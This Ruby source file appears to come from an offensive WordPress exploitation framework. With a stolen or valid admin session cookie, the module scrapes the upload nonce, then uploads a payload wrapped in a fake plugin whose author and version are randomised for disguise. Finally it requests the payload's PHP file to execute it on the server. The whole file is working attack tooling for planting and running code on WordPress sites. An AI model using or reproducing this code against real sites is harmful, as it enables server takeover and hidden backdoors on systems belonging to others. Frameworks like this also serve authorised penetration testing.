# frozen_string_literal: true

# Provides functionality required to interact with the plugin system.
module Wpxf::WordPress::Plugin
  # Retrieve a valid nonce to use for plugin uploads.
  # @param cookie [String] a valid admin session cookie.
  # @return [String, nil] the nonce, nil on error.
  def fetch_plugin_upload_nonce(cookie)
    res = execute_get_request(url: wordpress_url_plugin_upload, cookie: cookie)
    return nil unless res&.code == 200
    res.body[/id="_wpnonce" name="_wpnonce" value="([a-z0-9]+)"/i, 1]
  end

  # Create and upload a plugin that encapsulates the current payload.
  # @param name [String] the name of the plugin.
  # @param payload_name [String] the name the payload should use on the server.
  # @param cookie [String] a valid admin session cookie.
  # @return [Boolean] true on success, false on error.
  def upload_payload_as_plugin(name, payload_name, cookie)
    nonce = fetch_plugin_upload_nonce(cookie)
    return false if nonce.nil?

    res = _upload_plugin(name, payload_name, cookie, nonce)
    res&.code == 200
  end

  # Upload and execute a payload as a plugin.
  # @param plugin_name [String] the name of the plugin.
  # @param payload_name [String] the name the payload should use on the server.
  # @param cookie [String] a valid admin session cookie.
  # @return [HttpResponse, nil] the {Wpxf::Net::HttpResponse} of the request.
  def upload_payload_as_plugin_and_execute(plugin_name, payload_name, cookie)
    unless upload_payload_as_plugin(plugin_name, payload_name, cookie)
      emit_error 'Failed to upload the payload'
      return nil
    end

    payload_url = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    emit_info "Executing the payload at #{payload_url}..."
    res = execute_get_request(url: payload_url)

    has_body = res&.code == 200 && !res.body.strip.empty?
    emit_success "Result: #{res.body}" if has_body
    res
  end

  # Generate a valid WordPress plugin header / base file.
  # @param plugin_name [String] the name of the plugin.
  # @return [String] a PHP script with the appropriate meta data.
  def generate_wordpress_plugin_header(plugin_name)
    ['<?php',
     '/**',
     "* Plugin Name: #{plugin_name}",
     "* Version: #{_generate_wordpress_plugin_version}",
     "* Author: #{Wpxf::Utility::Text.rand_alpha(10)}",
     "* Author URI: http://#{Wpxf::Utility::Text.rand_alpha(10)}.com",
     '* License: GPL2',
     '*/',
     '?>'].join("\n")
  end

  private

  def _generate_wordpress_plugin_version
    "#{Wpxf::Utility::Text.rand_numeric(1)}."\
    "#{Wpxf::Utility::Text.rand_numeric(1)}."\
    "#{Wpxf::Utility::Text.rand_numeric(2)}"
  end

  # Build the body and return the response of the request.
  def _upload_plugin(plugin_name, payload_name, cookie, nonce)
    builder = _plugin_upload_builder(plugin_name, payload_name, nonce)
    builder.create do |body|
      return execute_post_request(
        url: wordpress_url_admin_update,
        params: { 'action' => 'upload-plugin' },
        body: body,
        cookie: cookie
      )
    end
  end

  # A hash containing the file paths and contents for the ZIP file.
  def _plugin_files(plugin_name, payload_name)
    plugin_script = generate_wordpress_plugin_header(plugin_name)
    {
      "#{plugin_name}/#{plugin_name}.php" => plugin_script,
      "#{plugin_name}/#{payload_name}.php" => payload.encoded
    }
  end

  # A {BodyBuilder} with the required fields to upload a plugin.
  def _plugin_upload_builder(plugin_name, payload_name, nonce)
    zip_fields = _plugin_files(plugin_name, payload_name)
    builder = Wpxf::Utility::BodyBuilder.new
    builder.add_field('_wpnonce', nonce)
    builder.add_field('_wp_http_referer', wordpress_url_plugin_upload)
    builder.add_zip_file('pluginzip', zip_fields, "#{plugin_name}.zip")
    builder.add_field('install-plugin-submit', 'Install Now')
    builder
  end
end
